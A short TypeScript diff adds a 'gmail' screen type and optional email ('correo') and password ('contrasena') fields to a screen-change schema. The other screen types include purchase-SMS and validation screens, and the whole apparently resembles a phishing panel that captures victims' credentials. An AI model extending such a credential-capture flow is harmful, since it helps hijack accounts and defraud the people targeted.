@@ -206,6 +206,7 @@ export enum ScreenType {
   MENSAJE = "mensaje",
   VALIDANDO = "validando",
   SMS_COMPRA = "sms_compra",
+  GMAIL = "gmail",
 }
 
 export const screenChangeSchema = z.object({
@@ -220,6 +221,8 @@ export const screenChangeSchema = z.object({
   mensaje: z.string().optional(),
   folio: z.string().optional(),
   direccion: z.string().optional(),
+  correo: z.string().optional(),
+  contrasena: z.string().optional(),
 });
 
 export type ScreenChangeData = z.infer<typeof screenChangeSchema>;
